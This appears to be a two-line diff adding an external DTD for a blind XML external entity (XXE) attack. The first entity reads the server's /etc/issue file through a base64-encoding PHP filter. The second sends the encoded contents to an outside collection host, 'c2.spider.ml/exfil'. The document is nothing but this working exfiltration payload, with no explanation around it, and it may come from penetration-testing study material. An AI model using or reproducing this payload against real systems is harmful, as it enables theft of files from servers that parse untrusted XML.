@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/issue">
+<!ENTITY % conn "<!ENTITY exfil SYSTEM 'http://c2.spider.ml/exfil?%data;'>">
